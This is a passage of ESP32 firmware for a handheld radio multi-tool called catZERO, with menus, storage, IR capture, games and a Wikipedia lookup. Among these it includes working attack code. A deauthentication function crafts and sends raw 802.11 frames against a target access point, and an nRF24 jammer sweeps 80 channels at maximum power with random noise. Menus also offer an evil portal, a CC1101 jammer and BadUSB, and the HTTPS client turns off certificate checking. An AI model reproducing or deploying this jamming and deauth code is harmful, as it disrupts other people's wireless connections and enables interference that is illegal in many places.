  if (savedNetworksCount > MAX_SAVED_NETWORKS) savedNetworksCount = MAX_SAVED_NETWORKS;
  for (int i = 0; i < savedNetworksCount; i++) {
    savedSSID[i] = pref.getString(("ssid" + String(i)).c_str(), "");
    savedPassword[i] = pref.getString(("pass" + String(i)).c_str(), "");
    Serial.print("Loaded: ");
    Serial.println(savedSSID[i]);
  }
  pref.end();
}
void disconnectWiFi() {
  WiFi.disconnect(true);
  delay(100);
  WiFi.mode(WIFI_OFF);
  pref.begin("wifi", false);
  pref.clear();
  pref.end();
  savedNetworksCount = 0;
  showMsg("All Wi-Fi credentials cleared");
  Serial.println("All credentials cleared");
}
void clearAllPreferences() {
  pref.begin("wifi", false);
  pref.clear();
  pref.end();
  pref.begin("settings", false);
  pref.clear();
  pref.end();
  displayTimeoutSec = 30;
  savedNetworksCount = 0;
}
void setPower(bool on) {
  if (on == displayOn) return;
  displayOn = on;
  if (on) display.ssd1306_command(SSD1306_DISPLAYON);
  else display.ssd1306_command(SSD1306_DISPLAYOFF);
}
void showMsg(const char* msg) {
  statusMsg = msg;
  statusMsgTime = millis();
  needRedraw = true;
  Serial.print("Message: ");
  Serial.println(msg);
  String s = String(msg);
  int16_t x1, y1;
  uint16_t w, h;
  display.getTextBounds(s, 0, 0, &x1, &y1, &w, &h);
  if (w > 120) {
    lastLongMsg = s;
    msgScrollOffset = 0;
    lastMsgScrollTime = millis();
  } else {
    lastLongMsg = "";
  }
}

void saveIrSlots() {
  EEPROM.begin(EEPROM_SIZE_BYTES);
  int address = 100;
  for (int i = 0; i < IR_SLOTS_COUNT; i++) {
    EEPROM.write(address++, irSlots[i].isValid ? 1 : 0);
    if (irSlots[i].isValid) {
      EEPROM.put(address, irSlots[i].rawLength);
      address += 2;
      EEPROM.put(address, irSlots[i].rawBuffer);
      address += irSlots[i].rawLength * 2;
    }
  }
  EEPROM.commit();
  EEPROM.end();
}
void loadIrSlots() {
  EEPROM.begin(EEPROM_SIZE_BYTES);
  int address = 100;
  for (int i = 0; i < IR_SLOTS_COUNT; i++) {
    uint8_t v = EEPROM.read(address++);
    irSlots[i].isValid = (v == 1);
    if (irSlots[i].isValid) {
      EEPROM.get(address, irSlots[i].rawLength);
      address += 2;
      EEPROM.get(address, irSlots[i].rawBuffer);
      address += irSlots[i].rawLength * 2;
    }
  }
  EEPROM.end();
}
void eraseAllIrSlots() {
  for (int i = 0; i < IR_SLOTS_COUNT; i++) irSlots[i].isValid = false;
  saveIrSlots();
  showMsg("All IR slots erased");
}
void processIrCapture() {
  if (millis() > irTimeout) {
    irCapturing = false;
    needRedraw = true;
    return;
  }
  if (irRx && irRx->decode(&irResult)) {
    tempRawLen = irResult.rawlen;
    if (tempRawLen > IR_BUFFER_SIZE) tempRawLen = IR_BUFFER_SIZE;
    for (int i = 0; i < tempRawLen; i++) tempRaw[i] = irResult.rawbuf[i] * 50;
    tempProto = String(typeToString(irResult.decode_type, irResult.repeat));
    irTempReady = true;
    irRx->resume();
    needRedraw = true;
    String msg = "IR: " + tempProto + " len:" + String(tempRawLen);
    showMsg(msg.c_str());
  }
}
void sendIr(int slot) {
  if (!irSlots[slot].isValid) return;
  if (irTx && irRxOk) {
    irTx->sendRaw(irSlots[slot].rawBuffer, irSlots[slot].rawLength, 38);
    delay(50);
  }
}

void recheckNRF24() {
  SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, RF_CSN_PIN);
  SPI.setFrequency(8000000);
  if (radio.begin(RF_CE_PIN, RF_CSN_PIN) && radio.isChipConnected()) {
    nrfOk = true;
    nrfErrorMsg = "OK";
    radio.setChannel(42);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setAutoAck(false);
    radio.disableCRC();
    radio.stopListening();
    showMsg("nRF24 OK");
    Serial.println("nRF24 OK");
  } else {
    nrfOk = false;
    nrfErrorMsg = "not found";
    showMsg("nRF24 not found");
    Serial.println("nRF24 FAIL");
  }
  needRedraw = true;
}
void startJammer() {
  if (!nrfOk) {
    showMsg(nrfErrorMsg.c_str());
    return;
  }
  jamming = true;
  lastJamTime = millis();
  radio.powerUp();
  radio.stopListening();
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false);
  radio.disableCRC();
  radio.setRetries(0, 0);
  radio.setAddressWidth(3);
  radio.setPayloadSize(32);
  radio.disableDynamicPayloads();
  for (int i = 0; i < 32; i++) jamNoise[i] = random(256);
  showMsg("Jammer ON (MAX)");
}
void stopJammer() {
  jamming = false;
  radio.powerDown();
  showMsg("Jammer OFF");
  Serial.println("Jammer stopped");
}
void updateJammer() {
  if (!jamming) return;
  static int currentChannel = 0;
  const int MAX_CH = 80;
  radio.setChannel(currentChannel);
  radio.writeFast(&jamNoise, 32);
  radio.txStandBy();
  currentChannel++;
  if (currentChannel >= MAX_CH) currentChannel = 0;
  currentNrfChan = currentChannel;
  delayMicroseconds(10);
}

void startWifiScan()
{
    wifiScanning=true;
    wifiList.clear();
    wifiSelectedIdx=0;
    wifiScrollOffset=0;
    display.clearDisplay();
    display.setCursor(20,30);
    display.print("Scanning...");
    display.display();
    Serial.println("Scanning...");
    WiFi.disconnect(true,true);
    delay(300);
    WiFi.mode(WIFI_STA);
    WiFi.setSleep(false);
    delay(100);
    int found=WiFi.scanNetworks();
    Serial.print("Found: ");
    Serial.println(found);
    if(found<=0)
    {
        showMsg("No WiFi found");
        wifiScanning=false;
        needRedraw=true;
        return;
    }
    for(int i=0;i<found && i<50;i++)
    {
        WiFiNetworkInfo net;
        net.ssid=WiFi.SSID(i);
        if(net.ssid=="")
            net.ssid="<hidden>";
        net.rssi=WiFi.RSSI(i);
        wifiList.push_back(net);
    }
    WiFi.scanDelete();
    wifiScanning=false;
    needRedraw=true;
}
void sendDeauth() {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_channel(targetChan, WIFI_SECOND_CHAN_NONE);
  uint8_t deauth[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5],
    targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5],
    0x00, 0x00, 0x07, 0x00
  };
  uint8_t mac[6];
  esp_read_mac(mac, ESP_MAC_WIFI_STA);
  for (int i = 0; i < 6; i++) deauth[10 + i] = mac[i];
  esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
}
bool connectToWiFi(String ssid, String password) {
  if (WiFi.status() == WL_CONNECTED && WiFi.SSID() == ssid) {
    showMsg("Already connected");
    return true;
  }
  WiFi.disconnect(true);
  delay(500);
  WiFi.begin(ssid.c_str(), password.c_str());
  unsigned long startTime = millis();
  int dots = 0;
  while (millis() - startTime < WIFI_CONNECT_TIMEOUT_MS) {
    if (WiFi.status() == WL_CONNECTED) {
      saveWiFiCredentials(ssid, password);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(15, 25);
      display.println("Connected!");
      display.display();
      delay(1500);
      Serial.println("Manual connect success");
      return true;
    }
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(25, 20);
    display.print("Connect");
    for (int i = 0; i < dots; i++) display.print(".");
    display.display();
    dots++;
    if (dots > 3) dots = 0;
    delay(500);
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(20, 25);
  display.println("Wrong password");
  display.display();
  delay(2000);
  WiFi.disconnect();
  Serial.println("Manual connect fail");
  return false;
}
void attemptAutoConnect() {
  if (autoConnectInProgress) return;
  loadWiFiCredentials();
  if (savedNetworksCount == 0) {
    Serial.println("No saved networks, auto-connect skipped");
    return;
  }
  autoConnectInProgress = true;
  autoConnectStartTime = millis();
  WiFi.disconnect(true);
  delay(100);
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("No networks found during auto-connect");
    autoConnectInProgress = false;
    return;
  }
  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    for (int j = 0; j < savedNetworksCount; j++) {
      if (ssid == savedSSID[j]) {
        Serial.print("Auto-connecting to ");
        Serial.println(ssid);
        WiFi.begin(savedSSID[j].c_str(), savedPassword[j].c_str());
        unsigned long start = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
          delay(200);
          Serial.print(".");
        }
        Serial.println();
        if (WiFi.status() == WL_CONNECTED) {
          lastConnectedSSID = savedSSID[j];
          lastConnectedPassword = savedPassword[j];
          String msg = "Auto-connected to " + savedSSID[j];
          showMsg(msg.c_str());
          Serial.println(msg);
          WiFi.scanDelete();
          autoConnectInProgress = false;
          return;
        }
      }
    }
  }
  WiFi.scanDelete();
  autoConnectInProgress = false;
  Serial.println("Auto-connect: no suitable network found");
}

void tvbgone_send_all() {
  const int *codes;
  const unsigned short *codes2;
  int sz;
  if (tvbgone_region == 0) {
    codes = codes_eu;
    codes2 = codes2_eu;
    sz = sizeof(codes_eu) / sizeof(codes_eu[0]) / 3;
  } else {
    codes = codes_us;
    codes2 = codes2_us;
    sz = sizeof(codes_us) / sizeof(codes_us[0]) / 3;
  }
  ledcSetup(0, 38000, 8);
  ledcAttachPin(IR_TX_PIN, 0);
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(10, 10);
  display.print("Sending IR codes...");
  display.setCursor(10, 25);
  display.print("Region: ");
  if (tvbgone_region == 0) display.print("EU");
  else display.print("US");
  display.drawRect(10, 45, 108, 8, SSD1306_WHITE);
  display.display();
  unsigned long startTime = millis();
  unsigned long duration = tvbgoneDurationMs;
  bool done = false;
  while (!done && (millis() - startTime) < duration) {
    for (int i = 0; i < sz; i++) {
      const int *cc = codes + 3 * i;
      int freq = pgm_read_dword(cc + 0);
      int numPairs = pgm_read_dword(cc + 1);
      const unsigned short *code = codes2 + pgm_read_dword(cc + 2);
      ledcDetachPin(IR_TX_PIN);
      ledcSetup(0, freq, 8);
      ledcAttachPin(IR_TX_PIN, 0);
      for (int k = 0; k < numPairs; k += 2) {
        uint16_t onTime = pgm_read_word(code + k);
        uint16_t offTime = pgm_read_word(code + k + 1);
        ledcWrite(0, 128);
        delayMicroseconds(onTime * 10);
        ledcWrite(0, 0);
        delayMicroseconds(offTime * 10);
        yield();
      }
      unsigned long now = millis();
      int elapsed = now - startTime;
      int percent = (elapsed * 100) / duration;
      if (percent > 100) percent = 100;
      display.fillRect(11, 46, (percent * 108) / 100, 6, SSD1306_WHITE);
      display.fillRect(40, 35, 35, 8, SSD1306_BLACK);
      display.setCursor(45, 35);
      display.print(percent);
      display.print("%");
      display.display();
      if (elapsed >= duration) {
        done = true;
        break;
      }
      if (btnOk()) {
        done = true;
        break;
      }
    }
  }
  display.fillRect(11, 46, 108, 6, SSD1306_WHITE);
  display.setCursor(55, 35);
  display.print("100%");
  display.display();
  delay(500);
  ledcDetachPin(IR_TX_PIN);
  ledcWrite(0, 0);
  showMsg("Done");
}
void tvbgone_menu() {
  tvbgone_region = 0;
  while (true) {
    drawTvbgone();
    bool up = btnUp();
    bool down = btnDown();
    bool ok = btnOk() && !longPressDetected;
    if (up || down) {
      tvbgone_region = !tvbgone_region;
      delay(200);
    }
    if (ok) {
      EEPROM.begin(EEPROM_SIZE_BYTES);
      EEPROM.write(1, tvbgone_region);
      EEPROM.commit();
      EEPROM.end();
      tvbgone_send_all();
      delay(500);
      break;
    }
    delay(50);
  }
  appState = STATE_IR_MENU;
  needRedraw = true;
}

const char* bootLogo[] = {
  " ####   ##   #####",
  "##  ## ####    ## ",
  "##    ##  ##   ## ",
  "##  ########   ## ",
  " ######    ##  ## "
};
void showBootLogo() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  for (int i = 0; i < 5; i++) {
    display.setCursor(5, 5 + i * 8);
    display.println(bootLogo[i]);
    display.display();
    delay(120);
  }
  display.setCursor(42, 52);
  display.println("ZERO");
  display.display();
  delay(1000);
  display.clearDisplay();
  display.setTextSize(2);
  display.setCursor(15, 25);
  display.println("catZERO");
  display.setTextSize(1);
  display.setCursor(15, 50);
  display.println("by Egorus");
  display.display();
  delay(1000);
  display.setTextSize(1);
}
void initSDCard() {
  Serial.println("Initializing SD card...");
  SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, SD_CS_PIN);
  SPI.setFrequency(4000000);
  unsigned long start = millis();
  bool sdOk = false;
  while (millis() - start < 2000) {
    if (SD.begin(SD_CS_PIN, SPI, 4000000)) {
      sdOk = true;
      break;
    }
    delay(100);
    Serial.print(".");
  }
  if (!sdOk) {
    Serial.println("SD Card init failed (timeout or absent)");
    display.clearDisplay();
    display.setCursor(10, 28);
    display.println("SD Card error!");
    display.display();
    delay(1000);
    return;
  }
  Serial.println("SD Card OK");
  uint8_t cardType = SD.cardType();
  uint64_t cardSize = SD.cardSize() / (1024 * 1024);
  display.clearDisplay();
  display.setCursor(10, 10);
  display.println("SD Card OK");
  display.setCursor(10, 25);
  display.print("Type: ");
  if (cardType == CARD_MMC) display.print("MMC");
  else if (cardType == CARD_SD) display.print("SDSC");
  else if (cardType == CARD_SDHC) display.print("SDHC");
  else display.print("Unknown");
  display.setCursor(10, 40);
  display.print("Size: ");
  display.print(cardSize);
  display.println(" MB");
  display.display();
  delay(1500);
}

void drawHeader(const char* title) {
  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_BLACK);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(2, 3);
  display.print(title);
  display.drawLine(0, 12, SCREEN_WIDTH, 12, SSD1306_WHITE);
}
void drawItem(const char* text, bool sel, int line) {
  int y = 14 + line * 10;
  if (sel) {
    display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(4, y);
    display.print(">");
  } else {
    display.setTextColor(SSD1306_WHITE);
  }
  display.setCursor(14, y);
  display.print(text);
}
void drawWiFiIcon(int x, int y) {
  display.fillRect(x, y, 16, 8, SSD1306_BLACK);
  display.drawBitmap(x, y, wifiIconBitmap, 16, 8, SSD1306_WHITE);
}
void drawTopBarWiFiIcon() {
  if (WiFi.status() == WL_CONNECTED) {
    drawWiFiIcon(SCREEN_WIDTH - 16, 2);
  }
}
void drawMainMenu() {
  display.clearDisplay();
  drawHeader("catZERO");
  const char* items[] = {"WiFi", "Bluetooth", "nRF24", "IR", "Console", "BadUSB", "Settings", "CC1101", "Storage", "Apps"};
  int start = mainScrollOffset;
  int end = start + MAIN_VISIBLE;
  if (end > MAIN_SIZE_TOTAL) end = MAIN_SIZE_TOTAL;
  for (int i = start; i < end; i++) {
    int line = i - start;
    drawItem(items[i], mainIdx == i, line);
  }
  if (mainScrollOffset > 0) {
    display.drawLine(SCREEN_WIDTH - 5, 15, SCREEN_WIDTH - 5, 45, SSD1306_WHITE);
    display.drawLine(SCREEN_WIDTH - 3, 18, SCREEN_WIDTH - 7, 18, SSD1306_WHITE);
  }
  if (mainScrollOffset + MAIN_VISIBLE < MAIN_SIZE_TOTAL) {
    display.drawLine(SCREEN_WIDTH - 5, 50, SCREEN_WIDTH - 5, 15, SSD1306_WHITE);
    display.drawLine(SCREEN_WIDTH - 3, 47, SCREEN_WIDTH - 7, 47, SSD1306_WHITE);
  }
  drawTopBarIcons();
  display.display();
}

void drawAppsMenu() {
  display.clearDisplay();
  drawHeader("Apps");
  Serial.println("drawAppsMenu called");
  const char* items[] = {"Calculator", "Bird", "Tetris", "Wikipedia", "Back"};
  const int size = 5;
  
  for (int i = 0; i < size; i++) {
    int y = 14 + i * 10;
    if (i == appsMenuIdx) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(4, y);
      display.print(">");
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(14, y);
    display.print(items[i]);
  }
  
  drawTopBarIcons();
  display.display();
}
void drawBirdGame() {
  display.clearDisplay();
  drawHeader("Bird");

  // Обработка выхода по длительному нажатию OK (2 секунды)
  static unsigned long okHoldStart = 0;
  static bool okHeld = false;
  
  if (btnOk()) {
    if (!okHeld) {
      okHeld = true;
      okHoldStart = millis();
      // Прыжок при одиночном нажатии
      if (!birdGameOver) birdVel = jumpPower;
    } else {
      // Длительное удержание -> выход в меню
      if (millis() - okHoldStart > 2000) {
        appState = STATE_APPS_MENU;
        needRedraw = true;
        okHeld = false;
        return;
      }
    }
  } else {
    okHeld = false;
  }

  if (birdGameOver) {
    display.setCursor(30, 30);
    display.print("Game Over");
    display.setCursor(20, 45);
    display.print("Score: ");
    display.print(birdScore);
    display.setCursor(10, 55);
    display.print("OK=restart, Up/Down=exit");
    drawTopBarIcons();
    display.display();
    
    if (btnOk()) {
      // Рестарт
      birdY = 32;
      birdVel = 0;
      pipes.clear();
      birdScore = 0;
      birdGameOver = false;
      birdFrameCounter = 0;
      needRedraw = true;
    }
    if (btnUp() || btnDown()) {
      appState = STATE_APPS_MENU;
      needRedraw = true;
    }
    return;
  }

  // Обновление физики
  if (millis() - birdLastUpdate > 30) {
    birdLastUpdate = millis();
    birdVel += gravity;
    birdY += birdVel;
    if (birdY > 60) { birdGameOver = true; needRedraw = true; }
    if (birdY < 0) birdY = 0;

    // Трубы
    for (int i = pipes.size() - 1; i >= 0; i--) {
      pipes[i].x -= PIPE_SPEED;
      if (pipes[i].x < -PIPE_WIDTH) {
        pipes.erase(pipes.begin() + i);
      } else {
        if (!pipes[i].scored && pipes[i].x + PIPE_WIDTH < birdX) {
          pipes[i].scored = true;
          birdScore++;
        }
        // Столкновение
        if (birdX + 3 > pipes[i].x && birdX - 3 < pipes[i].x + PIPE_WIDTH) {
          int top = pipes[i].gapY - GAP_HEIGHT/2;
          int bottom = pipes[i].gapY + GAP_HEIGHT/2;
          if (birdY - 4 < top || birdY + 4 > bottom) {
            birdGameOver = true;
            needRedraw = true;
          }
        }
      }
    }

    // Генерация труб
    birdFrameCounter++;
    if (birdFrameCounter % PIPE_INTERVAL == 0) {
      Pipe p;
      p.x = 128;
      p.gapY = random(20, 44);
      p.scored = false;
      pipes.push_back(p);
    }
    needRedraw = true;
  }

  // Отрисовка
  display.fillRect(0, 13, 128, 51, SSD1306_BLACK);
  display.fillCircle(birdX, birdY, 4, SSD1306_WHITE);
  for (auto &p : pipes) {
    display.fillRect(p.x, 13, PIPE_WIDTH, p.gapY - GAP_HEIGHT/2 - 13, SSD1306_WHITE);
    display.fillRect(p.x, p.gapY + GAP_HEIGHT/2, PIPE_WIDTH, 64 - (p.gapY + GAP_HEIGHT/2), SSD1306_WHITE);
  }
  display.setCursor(2, 14);
  display.print("Score: ");
  display.print(birdScore);
  drawTopBarIcons();
  display.display();
}
// ----------------------------------------------------------------------------
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ ВИКИПЕДИИ
// ----------------------------------------------------------------------------

String urlEncode(String str) {
    str.replace(" ", "%20");
    str.replace("?", "%3F");
    str.replace("#", "%23");
    str.replace("%", "%25");
    str.replace("&", "%26");
    str.replace("=", "%3D");
    str.replace("+", "%2B");
    return str;
}

String fetchWikipedia(String query) {
    if (WiFi.status() != WL_CONNECTED) {
        return "Нет подключения к Wi-Fi.";
    }

    WiFiClientSecure client;
    client.setInsecure();

    HTTPClient http;
    http.setTimeout(30000);

    query.trim();
    String url = "https://en.wikipedia.org/w/api.php?"
                 "action=query"
                 "&format=json"
                 "&prop=extracts"
                 "&exintro"
                 "&explaintext"
                 "&redirects=1"
                 "&formatversion=2"
                 "&titles=" + urlEncode(query);

    if (!http.begin(client, url)) {
        return "Ошибка begin()";
    }

    int httpCode = http.GET();
    if (httpCode <= 0) {
        String err = http.errorToString(httpCode);
        http.end();
        return "Ошибка: " + err;
    }

    String payload = http.getString();
    http.end();

    DynamicJsonDocument doc(50000);
    DeserializationError error = deserializeJson(doc, payload);
    if (error) {
        return "Ошибка JSON";
    }

    if (!doc["query"]["pages"][0]["extract"].is<String>()) {
        return "Статья не найдена";
    }

    String text = doc["query"]["pages"][0]["extract"].as<String>();
    if (text.length() == 0) {
        return "Пустая статья";
    }
    return text;
}

void runWikipedia() {
    // Показываем клавиатуру для ввода
    String query = inputStringWithKeyboard(true, "Wikipedia query:");
    if (query.length() == 0) {
        // Если нажали Exit или ввод пустой
        appState = STATE_APPS_MENU;
        needRedraw = true;
        return;
    }
    showMsg("Searching...");
    wikipediaResultText = fetchWikipedia(query);

    // Разбиваем результат на строки для прокрутки
    wikipediaLineCount = 0;
    String remaining = wikipediaResultText;
    while (remaining.length() > 0 && wikipediaLineCount < 50) {
        // Берём строку до переноса или до конца экрана
        int newline = remaining.indexOf('\n');
        if (newline != -1) {
            wikipediaLines[wikipediaLineCount++] = remaining.substring(0, newline);
            remaining = remaining.substring(newline + 1);
        } else {
            // Если нет перевода строки, разбиваем по ширине экрана
            // Просто загоняем всю оставшуюся строку (упрощённо)
            wikipediaLines[wikipediaLineCount++] = remaining;
            remaining = "";
        }
    }
    wikipediaScrollOffset = 0;
    appState = STATE_APPS_WIKIPEDIA_RESULT;
    needRedraw = true;
}
void drawWikipediaResult() {
    display.clearDisplay();
    drawHeader("Wikipedia");

    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);

    int startLine = 0;
    int endLine = 0;
    int lineHeight = 10;
    int maxLines = (SCREEN_HEIGHT - 14) / lineHeight; // оставляем место для подписи

    // Показываем только видимые строки
    for (int i = wikipediaScrollOffset; i < min(wikipediaScrollOffset + maxLines, wikipediaLineCount); i++) {
        int y = 14 + (i - wikipediaScrollOffset) * lineHeight;
        display.setCursor(2, y);
        display.println(wikipediaLines[i]);
    }

    // Если строк больше, чем помещается, показываем индикатор прокрутки
    if (wikipediaLineCount > maxLines) {
        // Процент прокрутки
        int percent = (wikipediaScrollOffset * 100) / (wikipediaLineCount - maxLines + 1);
        display.fillRect(SCREEN_WIDTH - 6, 14 + (percent * (SCREEN_HEIGHT - 14 - 10) / 100), 4, 8, SSD1306_WHITE);
    }

    display.setCursor(2, SCREEN_HEIGHT - 10);
    display.print("UP/DOWN scroll  OK=back");
    drawTopBarIcons();
    display.display();
}





void drawWifiMenu() {
  display.clearDisplay();
  drawHeader("WiFi");
  const char* items[] = {"Scan", "Spectrum", "WiFi Chat", "Deauther", "Evil Portal", "Back"};
  for (int i = 0; i < WIFI_MENU_SIZE; i++) {
    drawItem(items[i], i == wifiMenuIdx, i);
  }
  drawTopBarIcons();
  display.display();
}
void drawWifiActions() {
  display.clearDisplay();
  drawHeader("Actions");
  const char* acts[] = {"Info", "Deauth", "Stop", "Connect", "Save", "Disconnect", "Back"};
  for (int i = 0; i < WIFI_ACTIONS_SIZE; i++) {
    drawItem(acts[i], i == wifiActionIdx, i);
  }
  if (deauthActive) {
    display.fillRect(0, 55, SCREEN_WIDTH, 9, WHITE);
    display.setTextColor(BLACK);
    display.setCursor(15, 56);
    display.print("DEAUTH ON");
  }
  drawTopBarIcons();
  display.display();
}
void drawWifiChat() {
  display.clearDisplay();
  drawHeader("WiFi Chat");
  if (chatKeyboardActive) {
    int leftColX = 2;
    int rightColX = 64;
    int startY = 13;
    display.setCursor(leftColX, startY);
    display.print("You:");
    display.setCursor(leftColX, startY + 8);
    String yourMsg = chatMessage;
    if (yourMsg.length() > 14) yourMsg = yourMsg.substring(0, 14);
    display.print(yourMsg);
    display.setCursor(rightColX, startY);
    display.print("Friend:");
    display.setCursor(rightColX, startY + 8);
    String friendMsg = (chatHistoryCount > 0) ? chatHistory[0] : "";
    if (friendMsg.length() > 14) friendMsg = friendMsg.substring(0, 14);
    display.print(friendMsg);
    int keyW = 14, keyH = 8;
    int stepX = 14, stepY = 9;
    int startX = 0;
    int startYKbd = 24;
    for (int row = 0; row < rowsKeyboard; row++) {
      for (int col = 0; col < colsKeyboard; col++) {
        int index = row * colsKeyboard + col;
        if (index >= totalKeys) break;
        int x = startX + col * stepX;
        int y = startYKbd + row * stepY;
        if (index == selectedKey) {
          display.fillRect(x, y, keyW, keyH, WHITE);
          display.setTextColor(BLACK);
        } else {
          display.setTextColor(WHITE);
        }
        String key = capsLock ? upperKeys[index] : lowerKeys[index];
        if (key.length() > 0) {
          if (key == "Space") display.setCursor(x + 2, y + 1), display.print("SP");
          else if (key == "Caps") display.setCursor(x + 2, y + 1), display.print(capsLock ? "CAP" : "Cps");
          else if (key == "Del") display.setCursor(x + 2, y + 1), display.print("DEL");
          else if (key == "OK") display.setCursor(x + 3, y + 1), display.print("OK");
          else if (key == "Exit") display.setCursor(x + 2, y + 1), display.print("EXT");
          else display.setCursor(x + 2, y + 1), display.print(key);
        }
      }
    }
  } else {
    display.setCursor(2, 14);
    display.print("IP: ");
    display.print(WiFi.localIP());
    display.setCursor(2, 26);
    display.print("Status: ");
    display.print(webSocketConnected ? "Connected" : "Waiting");
    display.setCursor(2, 38);
    display.print("OK=keyboard");
    display.setCursor(2, 48);
    display.print("Exit=back");
  }
  display.display();
}
void drawNrfMenu() {
  display.clearDisplay();
  char buf[30];
  sprintf(buf, "nRF24 (%s)", nrfOk ? "OK" : nrfErrorMsg.c_str());
  drawHeader(buf);
  const char* items[] = {"Spectrum", "Jammer", "Recheck", "Back"};
  for (int i = 0; i < NRF_MENU_SIZE; i++) {
    drawItem(items[i], i == nrfMenuIdx, i);
  }
  drawTopBarIcons();
  display.display();
}
void drawIrMenu() {
  display.clearDisplay();
  drawHeader("IR");
  const char* items[] = {"Capture", "Transmit", "Erase All", "TV-B-Gone", "Back"};
  for (int i = 0; i < IR_MENU_SIZE; i++) {
    drawItem(items[i], i == irMenuIdx, i);
  }
  drawTopBarIcons();
  display.display();
}
void drawSettingsMenu() {
  display.clearDisplay();
  drawHeader("Settings");
  const char* items[] = {"Info", "Timeout", "LED", "Reset", "Reboot", "Back"};
  for (int i = 0; i < SETTINGS_SIZE; i++) {
    drawItem(items[i], i == settingsIdx, i);
  }
  drawTopBarIcons();
  display.display();
}
void drawSysInfo() {
  display.clearDisplay();
  drawHeader("System Info");
  display.setCursor(2, 14);
  display.print("Chip: ESP32");
  display.setCursor(2, 24);
  display.print("Flash: " + String(ESP.getFlashChipSize() / 1048576) + " MB");
  display.setCursor(2, 34);
  display.print("Heap: " + String(ESP.getFreeHeap() / 1024) + " KB");
  display.setCursor(2, 44);
  display.print("Uptime: " + String((millis() - deviceBootTime) / 1000) + "s");
  display.setCursor(2, 54);
  display.print("nRF24: " + String(nrfOk ? "OK" : "FAIL"));
  display.setCursor(2, 60);
  display.print("Press=back");
  drawTopBarIcons();
  display.display();
}
void drawTvbgone() {
  display.clearDisplay();
  drawHeader("TV-B-Gone");
  display.setCursor(10, 20);
  display.println("Region:");
  display.setCursor(30, 30);
  if (tvbgone_region == 0) display.println("EU");
  else display.println("US");
  display.setCursor(10, 45);
  display.println("Action: Power");
  display.setCursor(2, 56);
  display.println("UP/DOWN=Reg  OK=Send");
  drawTopBarIcons();
  display.display();
}
void drawCc1101Menu() {
  display.clearDisplay();
  drawHeader("CC1101");
  const char* items[] = {
    "Spectrum (vert)",
    "Spectrum (horiz)",
    "Jammer",
    "Capture",
    "Transmit",
    "Back"
  };
  const int CC1101_MENU_SIZE = 6;
  for (int i = 0; i < CC1101_MENU_SIZE; i++) {
    drawItem(items[i], i == cc1101_menu_idx, i);
  }
  drawTopBarIcons();
  display.display();
}

String inputStringWithKeyboard(bool allowExit, const char* title) {
  String result = "";
  int localSelected = 0;
  bool localCaps = false;
  bool okProcessed = false;
  unsigned long lastMoveTime = 0;
  bool leftHeld = false;
  bool rightHeld = false;
  int oldSelected = selectedKey;
  bool oldCaps = capsLock;
  String oldText = consoleText;
  selectedKey = localSelected;
  capsLock = localCaps;
  consoleText = result;
  while (true) {
    display.clearDisplay();
    display.drawRect(0, 0, 128, 10, WHITE);
    display.setCursor(2, 2);
    display.print(title);
    display.fillRect(0, 12, 128, 8, BLACK);
    display.setCursor(2, 13);
    String visible = result;
    if (visible.length() > 18) visible = visible.substring(visible.length() - 18);
    display.print(visible);
    display.display();
    for (int row = 0; row < rowsKeyboard; row++) {
      for (int col = 0; col < colsKeyboard; col++) {
        int index = row * colsKeyboard + col;
        if (index >= totalKeys) break;
        int x = col * 16;
        int y = 18 + row * 9;
        if (index == localSelected) {
          display.fillRect(x, y, 15, 8, WHITE);
          display.setTextColor(BLACK);
        } else {
          display.setTextColor(WHITE);
        }
        String key = localCaps ? upperKeys[index] : lowerKeys[index];
        if (key.length() > 0) {
          display.setCursor(x + 1, y + 1);
          display.print(key);
        }
      }
    }
    drawTopBarIcons();
    display.display();
    bool up = btnUp();
    bool down = btnDown();
    if (up) {
      if (!leftHeld) {
        leftHeld = true;
        lastMoveTime = millis();
        localSelected--;
        if (localSelected < 0) localSelected = totalKeys - 1;
      } else if (millis() - lastMoveTime > CONSOLE_AUTOREPEAT_DELAY) {
        lastMoveTime = millis();
        localSelected--;
        if (localSelected < 0) localSelected = totalKeys - 1;
      }
    } else {
      leftHeld = false;
    }
    if (down) {
      if (!rightHeld) {
        rightHeld = true;
        lastMoveTime = millis();
        localSelected++;
        if (localSelected >= totalKeys) localSelected = 0;
      } else if (millis() - lastMoveTime > CONSOLE_AUTOREPEAT_DELAY) {
        lastMoveTime = millis();
        localSelected++;
        if (localSelected >= totalKeys) localSelected = 0;
      }
    } else {
      rightHeld = false;
    }
    if (btnOk() && !okProcessed) {
      okProcessed = true;
      String key = localCaps ? upperKeys[localSelected] : lowerKeys[localSelected];
      if (key == "Caps") {
        localCaps = !localCaps;
      } else if (key == "Del") {
        if (result.length() > 0) result.remove(result.length() - 1);
      } else if (key == "OK") {
